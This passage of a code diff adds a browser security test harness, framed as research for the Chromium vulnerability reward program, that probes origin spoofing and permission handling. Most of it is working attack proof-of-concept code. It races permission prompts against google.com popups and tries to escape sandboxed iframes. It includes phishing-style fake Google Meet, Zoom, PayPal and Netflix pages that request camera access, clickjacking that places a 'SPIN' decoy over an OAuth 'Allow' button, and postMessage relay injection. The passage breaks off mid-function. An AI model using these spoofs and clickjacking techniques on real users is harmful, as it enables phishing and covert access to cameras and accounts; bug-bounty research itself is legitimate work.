+      popup.document.write('<html><body><p>Starting location test...</p></body></html>');
+      setTimeout(() => {
+        try {
+          popup.location = `javascript:document.write('<b>Assigned via location=javascript:</b><br>origin='+origin)`;
+          log('v7-log', 'location= javascript: assigned — check popup URL bar', 'warn');
+          hint('[V7] location= javascript: assigned — URL bar behavior?');
+        } catch(e) {
+          log('v7-log', `location= javascript: blocked: ${e.message}`, 'err');
+        }
+      }, 500);
+    } catch(e) {
+      log('v7-log', `Error: ${e.message}`, 'err');
+    }
+  }
+}
+
+// ─────────────────────────────────────────────────────────
+// Export Notes
+// ─────────────────────────────────────────────────────────
+function exportNotes() {
+  const ua  = navigator.userAgent;
+  const ts  = new Date().toISOString();
+  const notes = document.getElementById('notes-text').value;
+
+  const report = `Chrome Origin Spoof VRP — Test Report
+Generated: ${ts}
+Browser: ${ua}
+
+=== OBSERVER NOTES ===
+${notes || '(no notes)'}
+
+=== VECTORS TESTED ===
+[V1] Navigation Timing Race
+[V2] Error Page Race
+[V3] History pushState Cross-Origin
+[V4] Download Redirect Attribution
+[V5] about:blank Opener Origin
+[V6] Blob URL Visual / Permission
+[V7] javascript: URL Display
+
+=== SUBMISSION ===
+Target: issues.chromium.org (New Issue → Security Bug)
+Component: Blink > SecurityFeature or Blink > UI > Browser
+Labels: Type-Bug-Security, Restrict-View-SecurityTeam
+`;
+
+  const blob = new Blob([report], {type: 'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `chrome-vrp-notes-${Date.now()}.txt`;
+  a.click();
+}
+
+// ─────────────────────────────────────────────────────────
+// V8 Shared helpers
+// ─────────────────────────────────────────────────────────
+let v8aDelay = 30;
+
+function selectV8Tab(btn, sub) {
+  document.querySelectorAll('.v8-tab').forEach(b => b.classList.remove('active-tab'));
+  document.querySelectorAll('.v8-panel').forEach(p => p.style.display = 'none');
+  btn.classList.add('active-tab');
+  document.getElementById('v8-panel-' + sub).style.display = 'block';
+}
+
+function v8log(msg, type='info') { log('v8-log', msg, type); }
+
+// Build a permission-requesting HTML payload
+function permHtml(type, label) {
+  const calls = {
+    camera:  `navigator.mediaDevices.getUserMedia({video:true})`,
+    mic:     `navigator.mediaDevices.getUserMedia({audio:true})`,
+    geo:     `navigator.geolocation.getCurrentPosition(()=>{}, ()=>{})`,
+    notify:  `Notification.requestPermission()`,
+  };
+  const call = calls[type] || calls.camera;
+  return `<!DOCTYPE html><html>
+<head><title>${label}</title>
+<style>
+  body{margin:0;font-family:-apple-system,sans-serif;background:#fff;display:flex;
+       align-items:center;justify-content:center;min-height:100vh;flex-direction:column}
+  .box{text-align:center;padding:32px;max-width:360px}
+  h2{font-size:22px;margin-bottom:8px}
+  p{color:#666;font-size:14px}
+  .btn{padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;
+       font-size:15px;cursor:pointer;margin-top:16px}
+  #status{margin-top:14px;font-size:13px;font-weight:600}
+</style></head>
+<body>
+<div class="box">
+  <h2>${label}</h2>
+  <p>Permission type: <strong>${type}</strong><br>
+  window.origin = <code id="orig"></code></p>
+  <button class="btn" onclick="doRequest()">Request Permission</button>
+  <div id="status"></div>
+</div>
+<script>
+  document.getElementById('orig').textContent = window.location.origin;
+  function doRequest() {
+    document.getElementById('status').textContent = 'Requesting...';
+    Promise.resolve(${call})
+      .then(r => {
+        const res = r ? (r.getTracks ? 'GRANTED (stream)' : r) : 'GRANTED';
+        document.getElementById('status').textContent = '✓ ' + res;
+        document.getElementById('status').style.color = 'green';
+        if (r && r.getTracks) r.getTracks().forEach(t=>t.stop());
+      })
+      .catch(e => {
+        document.getElementById('status').textContent = '✗ ' + e.message;
+        document.getElementById('status').style.color = 'red';
+      });
+  }
+  // Auto-request after 800ms so dialog appears quickly
+  setTimeout(doRequest, 800);
+<\/script>
+</body></html>`;
+}
+
+// ── V8a: Popup Permission Race ────────────────────────────
+function testV8a(type) {
+  const d = v8aDelay;
+  v8log(`[V8a ${type}] Opening popup → google.com, race permission request at ${d}ms`, 'info');
+
+  const popup = window.open('https://www.google.com', '_blank',
+    'width=800,height=600,toolbar=yes,location=yes,status=yes');
+  if (!popup) { v8log('✗ Popup blocked! Allow popups for localhost.', 'err'); return; }
+  popupRefs.push(popup);
+
+  hint(`[V8a] Popup open → racing ${type} permission at ${d}ms. Watch dialog origin!`);
+
+  setTimeout(() => {
+    try {
+      // Attempt to request permission from the popup context while it's on google.com
+      const permCalls = {
+        camera: () => popup.navigator.mediaDevices.getUserMedia({video:true}),
+        mic:    () => popup.navigator.mediaDevices.getUserMedia({audio:true}),
+        geo:    () => new Promise((res,rej) => popup.navigator.geolocation.getCurrentPosition(res,rej)),
+        notify: () => popup.Notification.requestPermission(),
+      };
+      v8log(`[V8a @${d}ms] Calling ${type} permission on popup...`, 'warn');
+      permCalls[type]()
+        .then(r => {
+          v8log(`[V8a @${d}ms] ⚡ PERMISSION GRANTED via race! Origin shown was google.com? → CRITICAL`, 'ok');
+          hint('🚨 V8a: Permission granted! Screenshot the dialog origin!');
+          if (r && r.getTracks) r.getTracks().forEach(t=>t.stop());
+        })
+        .catch(e => v8log(`[V8a @${d}ms] Denied/blocked: ${e.message}`, 'err'));
+    } catch(e) {
+      v8log(`[V8a @${d}ms] Cross-origin block on popup access: ${e.message.substring(0,80)}`, 'err');
+    }
+  }, d);
+}
+
+function testV8aSweep() {
+  v8log('[V8a] Auto sweep: 0, 10, 20, 30, 50, 80, 120, 200ms — camera only', 'info');
+  [0,10,20,30,50,80,120,200].forEach((d,i) => {
+    setTimeout(() => {
+      v8aDelay = d;
+      testV8a('camera');
+    }, i * 4500);
+  });
+}
+
+// ── V8b: Cross-Origin iframe Permission ──────────────────
+function testV8b(type) {
+  const container = document.getElementById('v8b-iframe-container');
+  container.innerHTML = '';
+
+  let permAttr, content;
+  if (type === 'camera') {
+    permAttr = 'camera;microphone';
+    content  = permHtml('camera', 'iframe Camera Test');
+  } else if (type === 'geo') {
+    permAttr = 'geolocation';
+    content  = permHtml('geo', 'iframe Geolocation Test');
+  } else if (type === 'notify') {
+    permAttr = 'notifications';
+    content  = permHtml('notify', 'iframe Notification Test');
+  } else if (type === 'opaque') {
+    // Sandboxed iframe → opaque origin
+    permAttr = 'camera';
+    content  = permHtml('camera', 'Opaque Origin (sandbox) Camera Test');
+  }
+
+  const blob = new Blob([content], {type: 'text/html'});
+  const url  = URL.createObjectURL(blob);
+  const iframe = document.createElement('iframe');
+  iframe.src   = url;
+  iframe.allow = permAttr;
+  if (type === 'opaque') iframe.sandbox = 'allow-scripts';
+  iframe.style.cssText = 'width:100%;height:280px;border:none';
+
+  container.appendChild(iframe);
+  v8log(`[V8b ${type}] iframe injected with allow="${permAttr}"${type==='opaque'?' sandbox=allow-scripts':''}`, 'warn');
+  v8log('[V8b] Check: does Chrome permission dialog show "localhost" or iframe blob origin?', 'info');
+  hint('[V8b] iframe will auto-request permission — observe dialog origin label');
+}
+
+// ── V8c: Sandboxed iframe ────────────────────────────────
+function testV8c(mode) {
+  const container = document.getElementById('v8c-container');
+  container.innerHTML = '';
+
+  let sandboxAttr, label, note;
+  if (mode === 'null-origin') {
+    sandboxAttr = 'allow-scripts';
+    label = 'Null Origin Camera (no allow-same-origin)';
+    note  = 'sandbox without allow-same-origin → null/opaque origin. Permission should be blocked or show "null".';
+  } else if (mode === 'same-origin') {
+    sandboxAttr = 'allow-scripts allow-same-origin';
+    label = 'Same-Origin Sandbox Camera';
+    note  = 'sandbox with allow-same-origin → inherits parent origin. Permission dialog should show localhost.';
+  } else if (mode === 'nested') {
+    sandboxAttr = 'allow-scripts allow-same-origin allow-popups';
+    label = 'Nested Sandbox Permission Escape';
+    note  = 'Can sandboxed iframe open a popup that escapes sandbox restrictions and requests permission with parent origin?';
+  }
+
+  const innerHtml = mode === 'nested'
+    ? `<!DOCTYPE html><html><body style="font-family:sans-serif;padding:20px">
+        <h3>Nested Sandbox Escape Test</h3>
+        <p>Sandbox: <code>${sandboxAttr}</code></p>
+        <p>window.origin = <code id="o"></code></p>
+        <button onclick="
+          document.getElementById('o').textContent=window.location.origin;
+          var w=window.open('about:blank','_blank','width=600,height=400');
+          if(w){
+            w.document.write('<html><body><p>Popup from sandboxed iframe</p><p>origin='+window.location.origin+'</p>');
+            w.navigator.mediaDevices.getUserMedia({video:true})
+              .then(s=>{w.document.write('<p style=color:green>GRANTED in popup!</p>');s.getTracks().forEach(t=>t.stop())})
+              .catch(e=>w.document.write('<p style=color:red>'+e.message+'</p>'))
+          } else { document.body.innerHTML+='<p style=color:red>Popup blocked</p>' }
+        " style="padding:8px 16px;cursor:pointer">Open Popup + Request Camera</button>
+       </body></html>`
+    : permHtml('camera', label);
+
+  const blob = new Blob([innerHtml], {type: 'text/html'});
+  const url  = URL.createObjectURL(blob);
+  const iframe = document.createElement('iframe');
+  iframe.src     = url;
+  iframe.sandbox = sandboxAttr;
+  iframe.allow   = 'camera;microphone';
+  iframe.style.cssText = 'width:100%;height:260px;border:1px solid var(--border);border-radius:6px';
+
+  const noteEl = document.createElement('p');
+  noteEl.style.cssText = 'font-size:12px;color:var(--yellow);margin:0 0 8px';
+  noteEl.textContent = '⚠ ' + note;
+  container.appendChild(noteEl);
+  container.appendChild(iframe);
+
+  v8log(`[V8c ${mode}] sandbox="${sandboxAttr}" — auto-requesting camera in ${mode === 'nested' ? '3s (click button)' : '~800ms'}`, 'warn');
+  v8log(`[V8c] ${note}`, 'info');
+  hint(`[V8c ${mode}] Watch permission dialog — what origin does Chrome show?`);
+}
+
+// ── V8d: data: URL Permission ────────────────────────────
+function testV8d(sub) {
+  const [type, ctx] = sub.split('-');
+  const label = `data: URL ${type.charAt(0).toUpperCase()+type.slice(1)} Test`;
+  const html  = permHtml(type === 'camera' ? 'camera' : type === 'geo' ? 'geo' : 'notify', label);
+  const b64   = btoa(unescape(encodeURIComponent(html)));
+  const dataUrl = `data:text/html;base64,${b64}`;
+
+  if (ctx === 'popup') {
+    const popup = window.open(dataUrl, '_blank', 'width=700,height=500,toolbar=yes,location=yes');
+    if (!popup) { v8log('✗ Popup blocked!', 'err'); return; }
+    popupRefs.push(popup);
+    v8log(`[V8d popup] data: URL popup opened for ${type} permission`, 'warn');
+    v8log('[V8d] URL bar shows "data:text/html..." — does permission dialog show "data:" or "localhost"?', 'info');
+    hint(`[V8d] data: URL requests ${type} permission — check dialog origin (should be "data:" or blocked)`);
+  } else {
+    // iframe mode
+    const container = document.getElementById('v8c-container');
+    container.innerHTML = '';
+    const iframe = document.createElement('iframe');
+    iframe.src   = dataUrl;
+    iframe.allow = 'camera;geolocation;notifications';
+    iframe.style.cssText = 'width:100%;height:260px;border:1px solid var(--border);border-radius:6px';
+    container.appendChild(iframe);
+    v8log(`[V8d iframe] data: URL in iframe requesting ${type} permission`, 'warn');
+    hint('[V8d iframe] data: iframe requests permission — which origin in dialog?');
+  }
+}
+
+// ── V8e: Pre-Navigation Inject / UI Spoof ───────────────
+function testV8e(theme) {
+  const popup = window.open('about:blank', '_blank',
+    'width=900,height=650,toolbar=yes,location=yes');
+  if (!popup) { v8log('✗ Popup blocked!', 'err'); return; }
+  popupRefs.push(popup);
+
+  const themes = {
+    meet: {
+      bg: '#ffffff', title: 'Google Meet',
+      logo: `<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#00897B"/><text x="16" y="22" text-anchor="middle" font-size="18" fill="#fff">M</text></svg>`,
+      sub: 'video-call.google.com · Ready to join?',
+      btnLabel: 'Join now', btnColor: '#00897B',
+      permType: 'camera', permLabel: 'camera & microphone',
+    },
+    zoom: {
+      bg: '#2D8CFF', title: 'Zoom Meeting',
+      logo: `<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#fff"/><text x="16" y="22" text-anchor="middle" font-size="18" fill="#2D8CFF">Z</text></svg>`,
+      sub: 'zoom.us · Meeting is ready',
+      btnLabel: 'Join Meeting', btnColor: '#fff',
+      permType: 'camera', permLabel: 'camera & microphone',
+    },
+    bank: {
+      bg: '#003087', title: 'PayPal Security Verification',
+      logo: `<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#009CDE"/><text x="16" y="22" text-anchor="middle" font-size="14" fill="#fff">PP</text></svg>`,
+      sub: 'paypal.com · Identity Verification',
+      btnLabel: 'Verify Identity', btnColor: '#FF9600',
+      permType: 'camera', permLabel: 'camera (face scan)',
+    },
+    fullscreen: {
+      bg: '#1a1a2e', title: 'Netflix — Verify Account',
+      logo: `<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="2" fill="#E50914"/><text x="16" y="22" text-anchor="middle" font-size="16" fill="#fff">N</text></svg>`,
+      sub: 'netflix.com · Account Security Check',
+      btnLabel: 'Continue', btnColor: '#E50914',
+      permType: 'camera', permLabel: 'camera',
+    },
+  };
+
+  const t = themes[theme] || themes.meet;
+  const isDark = theme === 'fullscreen';
+  const textColor = isDark ? '#ffffff' : '#202124';
+  const subColor  = isDark ? '#aaaaaa' : '#5f6368';
+
+  const spoofHtml = `<!DOCTYPE html><html>
+<head><title>${t.title}</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+       background:${t.bg};min-height:100vh;display:flex;align-items:center;justify-content:center}
+  .card{background:${isDark?'#16213e':'#fff'};border-radius:12px;padding:48px 44px;
+        max-width:420px;width:90%;text-align:center;
+        ${isDark?'border:1px solid #30363d':'box-shadow:0 2px 18px rgba(0,0,0,.15)'}}
+  h1{font-size:22px;font-weight:500;color:${textColor};margin:14px 0 8px}
+  .sub{font-size:13px;color:${subColor};margin-bottom:28px}
+  .notice{font-size:12px;color:${subColor};background:${isDark?'#21262d':'#f8f9fa'};
+          border-radius:6px;padding:10px 14px;margin-bottom:20px;line-height:1.5}
+  .btn{width:100%;padding:12px;background:${t.btnColor};color:${isDark||theme==='zoom'?'#003087':'#fff'};
+       border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:4px}
+  #status{margin-top:16px;font-size:13px;font-weight:600;min-height:20px}
+</style></head>
+<body>
+<div class="card">
+  ${t.logo}
+  <h1>${t.title}</h1>
+  <p class="sub">${t.sub}</p>
+  <div class="notice">
+    🔒 This site needs access to your <strong>${t.permLabel}</strong>
+    to continue. Click "${t.btnLabel}" to grant access.
+  </div>
+  <button class="btn" onclick="requestPerm()">${t.btnLabel}</button>
+  <div id="status"></div>
+  <p style="margin-top:16px;font-size:11px;color:${subColor}">
+    window.origin = <strong id="orig"></strong>
+  </p>
+</div>
+<script>
+  document.getElementById('orig').textContent = window.location.origin;
+  ${theme === 'fullscreen' ? "document.addEventListener('click',()=>document.documentElement.requestFullscreen().catch(()=>{}),{once:true});" : ''}
+  function requestPerm() {
+    const s = document.getElementById('status');
+    s.textContent = 'Requesting access...';
+    ${t.permType === 'camera'
+      ? `navigator.mediaDevices.getUserMedia({video:true,audio:true})
+          .then(r=>{s.textContent='✓ Access granted';s.style.color='green';r.getTracks().forEach(t=>t.stop())})
+          .catch(e=>{s.textContent='✗ '+e.message;s.style.color='red'})`
+      : `navigator.geolocation.getCurrentPosition(
+          ()=>{s.textContent='✓ Location granted';s.style.color='green'},
+          e=>{s.textContent='✗ '+e.message;s.style.color='red'})`}
+  }
+  setTimeout(requestPerm, 1200);
+<\/script>
+</body></html>`;
+
+  popup.document.open();
+  popup.document.write(spoofHtml);
+  popup.document.close();
+
+  const chain = theme === 'fullscreen' ? ' + fullscreen chain' : '';
+  v8log(`[V8e ${theme}] Spoofed ${t.title} UI injected into about:blank popup${chain}`, 'warn');
+  v8log('[V8e] Permission dialog auto-fires in 1.2s — observe: URL bar (about:blank) vs dialog origin (localhost)', 'info');
+  hint(`[V8e] ${t.title} spoof: does user notice URL bar says "about:blank"? Permission dialog says "localhost"?`);
+}
+
+// ─────────────────────────────────────────────────────────
+// V9 helpers
+// ─────────────────────────────────────────────────────────
+function selV9(btn, sub) {
+  document.querySelectorAll('.v9-tab').forEach(b => b.classList.remove('active-v9'));
+  document.querySelectorAll('.v9-panel').forEach(p => p.style.display = 'none');
+  btn.classList.add('active-v9');
+  document.getElementById('v9p-' + sub).style.display = 'block';
+}
+function v9log(msg, type='info') { log('v9-log', msg, type); }
+
+// ── V9a: srcdoc Origin Inheritance ──────────────────────
+function testV9a(mode) {
+  const container = document.getElementById('v9a-container');
+  container.innerHTML = '';
+
+  // Plant data in parent for srcdoc to read
+  localStorage.setItem('v9a-secret', 'PARENT_LOCALSTORAGE_SECRET_VALUE');
+  document.cookie = 'v9a_cookie=PARENT_COOKIE_VALUE; path=/';
+
+  const scripts = {
+    origin: `
+      document.body.style.cssText='font-family:monospace;font-size:12px;padding:12px;background:#010409;color:#c9d1d9';
+      const out = [
+        '<b style=color:#58a6ff>srcdoc origin check:</b>',
+        'window.origin = <b style=color:#ffa657>' + window.origin + '</b>',
+        'document.domain = <b style=color:#ffa657>' + document.domain + '</b>',
+        'document.cookie = <b style=color:' + (document.cookie ? '#ff7b72' : '#56d364') + '>' + (document.cookie || '(empty)') + '</b>',
+        'location.href = <b style=color:#ffa657>' + location.href + '</b>',
+      ];
+      document.body.innerHTML = out.join('<br>');`,
+
+    localstorage: `
+      document.body.style.cssText='font-family:monospace;font-size:12px;padding:12px;background:#010409;color:#c9d1d9';
+      let val = '(error)';
+      try { val = localStorage.getItem('v9a-secret') || '(null)'; } catch(e) { val = 'BLOCKED: '+e.message; }
+      document.body.innerHTML = '<b style=color:#58a6ff>srcdoc localStorage:</b><br>'
+        + 'getItem("v9a-secret") = <b style=color:' + (val.includes('SECRET') ? '#ff7b72>' : '#56d364>') + val + '</b><br>'
+        + '<small style=color:#8b949e>If SECRET value readable → srcdoc shares parent localStorage (same origin)</small>';`,
+
+    fetch: `
+      document.body.style.cssText='font-family:monospace;font-size:12px;padding:12px;background:#010409;color:#c9d1d9';
+      document.body.innerHTML = '<b style=color:#58a6ff>srcdoc fetch test:</b><br>Fetching /... ';
+      fetch('/').then(r => r.text()).then(t => {
+        document.body.innerHTML += '<b style=color:#ff7b72>SUCCESS (' + t.length + ' bytes)</b> — srcdoc can fetch parent origin resources';
+      }).catch(e => {
+        document.body.innerHTML += '<b style=color:#56d364>BLOCKED: ' + e.message + '</b>';
+      });`,
+
+    nested: `
+      document.body.style.cssText='font-family:monospace;font-size:12px;padding:12px;background:#010409;color:#c9d1d9';
+      document.body.innerHTML = '<b style=color:#58a6ff>Nested srcdoc:</b> ';
+      try {
+        const inner = document.createElement('iframe');
+        inner.srcdoc = '<script>parent.parent.document.title="NESTED_SRCDOC_ESCAPE_'+Date.now()+'";<\/script>';
+        document.body.appendChild(inner);
+        setTimeout(()=>{
+          document.body.innerHTML += 'parent.parent.document.title = <b style=color:#ffa657>' + parent.document.title + '</b>';
+        }, 500);
+      } catch(e) {
+        document.body.innerHTML += '<b style=color:#56d364>BLOCKED: ' + e.message + '</b>';
+      }`,
+  };
+
+  const iframe = document.createElement('iframe');
+  iframe.srcdoc = `<html><head></head><body><script>${scripts[mode]}<\/script></body></html>`;
+  iframe.style.cssText = 'width:100%;height:120px;border:none';
+  container.appendChild(iframe);
+  v9log(`[V9a ${mode}] srcdoc iframe injected — reading results...`, 'warn');
+  hint(`[V9a ${mode}] srcdoc has parent origin. Check what it can access.`);
+
+  setTimeout(() => {
+    try {
+      const body = iframe.contentDocument && iframe.contentDocument.body.innerText;
+      if (body && (body.includes('SECRET') || body.includes('SUCCESS'))) {
+        v9log(`[V9a ${mode}] ⚡ Data accessible from srcdoc! → ${body.substring(0,80)}`, 'ok');
+      }
+    } catch(e) { /* cross-origin read failed */ }
+  }, 600);
+}
+
+// ── V9b: Open Redirect iframe ────────────────────────────
+function testV9b(mode) {
+  const container = document.getElementById('v9b-container');
+  container.innerHTML = '';
+
+  if (mode === 'local-redirect') {
+    // Build a local blob that redirects to another blob (simulating open redirect)
+    const targetHtml = `<html><body style="font-family:monospace;padding:12px;background:#010409;color:#c9d1d9">
+      <b style="color:#ff7b72">ATTACKER CONTENT</b><br>
+      Loaded after redirect chain<br>
+      window.origin = <b id="o"></b>
+      <script>document.getElementById('o').textContent=window.origin<\/script>
+    </body></html>`;
+    const targetBlob = URL.createObjectURL(new Blob([targetHtml],{type:'text/html'}));
+
+    // Intermediate "redirect" blob
+    const redirectHtml = `<html><head>
+      <meta http-equiv="refresh" content="0;url=${targetBlob}">
+    </head><body>Redirecting...</body></html>`;
+    const redirectBlob = URL.createObjectURL(new Blob([redirectHtml],{type:'text/html'}));
+
+    const iframe = document.createElement('iframe');
+    iframe.src = redirectBlob;
+    iframe.style.cssText = 'width:100%;height:100px;border:1px solid var(--border);border-radius:6px';
+    container.appendChild(iframe);
+    log('v9b-log', '[V9b] Local blob redirect chain: redirectBlob → targetBlob. Final origin?', 'warn');
+    log('v9b-log', '[V9b] Key: if parent postMessage checks iframe.src (initial), attacker controls final content', 'info');
+    hint('[V9b] Redirect blob → blob. Parent sees initial src but content changed. postMessage trust?');
+
+  } else if (mode === 'csp-bypass') {
+    // Demonstrate CSP frame-src bypass concept via meta-refresh in intermediate frame
+    const demoHtml = `<html>
+    <head><meta http-equiv="Content-Security-Policy" content="frame-src blob: 'self'"></head>
+    <body style="font-family:monospace;padding:12px;font-size:12px">
+      <b style="color:#58a6ff">CSP frame-src bypass test</b><br>
+      This page has CSP: <code>frame-src blob: 'self'</code><br><br>
+      <iframe id="fi" src="about:blank" style="width:100%;height:60px;border:1px solid #ccc"></iframe>
+      <script>
+        // Try to load a blob that redirects outside the allowed frame-src
+        const evil = URL.createObjectURL(new Blob(['<html><body>OUTSIDE CSP — '+window.origin+'</body></html>'],{type:'text/html'}));
+        document.getElementById('fi').src = evil;
+        setTimeout(()=>{
+          try {
+            const txt = document.getElementById('fi').contentDocument.body.innerText;
+            document.body.innerHTML += '<br>iframe content: <b style=color:green>' + txt + '</b>';
+          } catch(e) {}
+        }, 400);
+      <\/script>
+    </body></html>`;
+    const blob = URL.createObjectURL(new Blob([demoHtml],{type:'text/html'}));
+    window.open(blob,'_blank','width=700,height:400,toolbar=yes,location=yes');
+    log('v9b-log', '[V9b CSP] Popup with frame-src CSP + blob iframe — checking bypass', 'warn');
+
+  } else if (mode === 'postmsg-trust') {
+    // Set up a relay pattern: parent trusts "relay" iframe → relay forwards from attacker iframe
+    const relayHtml = `<html><body><script>
+      // Naive relay: forward any message to parent
+      window.addEventListener('message', e => {
+        window.parent.postMessage({relayed: true, data: e.data, from: e.origin}, '*');
+      });
+      document.body.innerHTML = '<div style="padding:8px;font-size:12px;font-family:monospace;background:#010409;color:#56d364">Relay iframe active — forwarding messages to parent</div>';
+    <\/script></body></html>`;
+
+    const attackerHtml = `<html><body><script>
+      setTimeout(() => {
+        // Send malicious message to relay iframe (which will forward to parent with relay's origin)
+        const relay = window.parent.document.getElementById('v9b-relay');
+        if (relay) {
+          relay.contentWindow.postMessage({code: 'INJECTED_VIA_RELAY', secret: 'stolen'}, '*');
+        }
+      }, 500);
+      document.body.innerHTML = '<div style="padding:8px;font-size:12px;font-family:monospace;background:#010409;color:#ff7b72">Attacker iframe — sending msg to relay...</div>';
+    <\/script></body></html>`;
+
+    const relayUrl    = URL.createObjectURL(new Blob([relayHtml],    {type:'text/html'}));
+    const attackerUrl = URL.createObjectURL(new Blob([attackerHtml], {type:'text/html'}));
+
+    const wrap = document.createElement('div');
+    wrap.style.cssText = 'display:flex;gap:8px;flex-direction:column';
+
+    const relayIframe = document.createElement('iframe');
+    relayIframe.id  = 'v9b-relay';
+    relayIframe.src = relayUrl;
+    relayIframe.style.cssText = 'width:100%;height:50px;border:1px solid var(--green);border-radius:4px';
+
+    const attackIframe = document.createElement('iframe');
+    attackIframe.src = attackerUrl;
+    attackIframe.style.cssText = 'width:100%;height:50px;border:1px solid var(--red);border-radius:4px';
+
+    wrap.appendChild(relayIframe);
+    wrap.appendChild(attackIframe);
+    container.appendChild(wrap);
+
+    // Parent: "trust" relay iframe origin
+    const relayOrigin = new URL(relayUrl).origin;
+    window.addEventListener('message', function handler(e) {
+      if (e.data && e.data.relayed) {
+        log('v9b-log', `[V9b relay] Parent received relayed msg! Appears from: ${e.origin} | data: ${JSON.stringify(e.data.data)}`, 'ok');
+        log('v9b-log', '[V9b relay] ⚡ If parent trusted relay origin → attacker injected via relay!', 'ok');
+        window.removeEventListener('message', handler);
+      }
+    });
+    log('v9b-log', '[V9b postMsg] Relay (green) + Attacker (red) iframes loaded. Watching for relay...', 'warn');
+    hint('[V9b postMessage] Attacker → Relay → Parent. Does parent receive message with relay origin?');
+  }
+}
+
+// ── V9c: Clickjacking ────────────────────────────────────
+function testV9c(mode) {
+  const iframe = document.getElementById('v9c-iframe');
+
+  if (mode === 'framable') {
+    iframe.src = 'http://localhost:8080/';
+    log('v9c-log', '[V9c] Loaded localhost:8080 in iframe. Drag opacity slider to reveal overlay.', 'warn');
+    log('v9c-log', '[V9c] Real target: find pages without X-Frame-Options / frame-ancestors CSP', 'info');
+    hint('[V9c] Drag opacity to 50% to see overlay vs iframe alignment. Sensitive action visible?');
+
+  } else if (mode === 'oauth') {
+    // Simulate OAuth confirm overlay attack
+    const oauthTarget = `<html><body style="font-family:sans-serif;padding:30px;background:#fff">
+      <h2 style="color:#1a73e8">Allow App to access your account?</h2>
+      <p style="color:#555">This will allow attacker-app to:</p>
+      <ul style="color:#333;margin:12px 0"><li>Read your email</li><li>See your contacts</li></ul>
+      <div style="display:flex;gap:12px;margin-top:20px">
+        <button style="padding:10px 24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer"
+          onclick="alert('OAuth Confirmed! (simulated)')">Allow</button>
+        <button style="padding:10px 24px;background:#fff;border:1px solid #ccc;border-radius:4px;cursor:pointer">Deny</button>
+      </div>
+    </body></html>`;
+    const blob = URL.createObjectURL(new Blob([oauthTarget],{type:'text/html'}));
+    iframe.src = blob;
+
+    // Update decoy to align "Allow" button
+    document.getElementById('v9c-decoy').innerHTML = `
+      <div style="font-size:18px;font-weight:700;color:#333;margin-bottom:8px">Spin the wheel!</div>
+      <div style="font-size:14px;color:#666;margin-bottom:60px">Click SPIN to win a prize</div>
+      <div style="background:#1a73e8;color:#fff;padding:12px 40px;border-radius:4px;
+        font-size:15px;font-weight:600;cursor:pointer">SPIN!</div>`;
+    log('v9c-log', '[V9c OAuth] Decoy "SPIN" button aligned over OAuth "Allow" button. Drag opacity to verify.', 'ok');
+    hint('[V9c] SPIN button overlaps OAuth Allow. User clicks SPIN → actually clicks Allow!');
+
+  } else if (mode === 'drag') {
+    // Drag-and-drop clickjacking (text drag from invisible iframe)
+    iframe.src = `data:text/html,<html><body style="padding:20px;font-family:sans-serif">
+      <p draggable="true" style="user-select:all;color:#333">
+        SECRET_DRAG_CONTENT_FROM_IFRAME
+      </p></body></html>`;
+    document.getElementById('v9c-decoy').innerHTML = `
+      <div style="font-size:16px;font-weight:700;color:#333">Draw something!</div>
+      <div style="font-size:13px;color:#666;margin:8px 0 20px">Drag from the box below</div>
+      <div style="width:200px;height:50px;border:2px dashed #ccc;border-radius:6px;
+        display:flex;align-items:center;justify-content:center;color:#999">drag here</div>`;
+    log('v9c-log', '[V9c drag] Invisible iframe has draggable text. User drags from decoy → drags iframe content.', 'warn');
+    hint('[V9c drag] Drag from the dashed box — you may drag iframe content instead of decoy content!');
+
+  } else if (mode === 'cursor') {
+    // CSS cursor spoof
+    document.getElementById('v9c-demo').style.cursor =
+      'url("data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'32\' height=\'32\'><text y=\'24\' font-size=\'20\'>👆</text></svg>") 0 0, pointer';
+    iframe.src = 'about:blank';
+    document.getElementById('v9c-decoy').innerHTML = `
+      <div style="padding:20px;font-family:sans-serif">
+        <div style="font-size:16px;font-weight:700;color:#333">Notice the cursor position!</div>
+        <div style="font-size:13px;color:#666;margin:10px 0">The visual cursor appears offset from actual click point.</div>
+        <div style="margin-top:20px;text-align:left;font-size:12px;color:#999">
+          Move cursor here → click coords shifted<br>
+          (CSS cursor offset trick for misclick attacks)
+        </div>
+      </div>`;
+    log('v9c-log', '[V9c cursor] CSS cursor offset applied. Click "target" may hit different element.', 'warn');
+  }
+}
+
+// ── V9d: postMessage ─────────────────────────────────────
+function testV9d(mode) {
+  if (mode === 'relay-detect') {
+    // Check if a cross-origin iframe echoes/forwards messages (relay pattern)
+    const testBlob = URL.createObjectURL(new Blob([`<html><body><script>
+      window.addEventListener('message', e => {
+        // Naive relay: forward everything
+        if (e.data && e.data.type === 'ping') {
+          window.parent.postMessage({type:'pong', echo: e.data, from: window.location.origin}, '*');
+        }
+      });
+    <\/script></body></html>`], {type:'text/html'}));
+
+    const iframe = document.createElement('iframe');
+    iframe.src = testBlob;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    window.addEventListener('message', function h(e) {
+      if (e.data && e.data.type === 'pong') {
+        log('v9d-log', `[V9d relay] ⚡ Relay detected! Got pong from ${e.origin}. Echoed: ${JSON.stringify(e.data.echo)}`, 'ok');
+        log('v9d-log', '[V9d] Chain: attacker → relay iframe → parent. If parent trusts relay origin, this is the bypass.', 'info');
+        window.removeEventListener('message', h);
+        document.body.removeChild(iframe);
+      }
+    });
+
+    iframe.onload = () => {
+      iframe.contentWindow.postMessage({type:'ping', payload:'INJECTED_PAYLOAD'}, '*');
+      log('v9d-log', '[V9d] Sent ping to relay iframe — waiting for echoed pong to arrive at parent...', 'warn');
+    };
+    hint('[V9d relay-detect] Sending msg to iframe — watch if pong arrives at parent with iframe origin');
+
+  } else if (mode === 'wildcard-leak') {
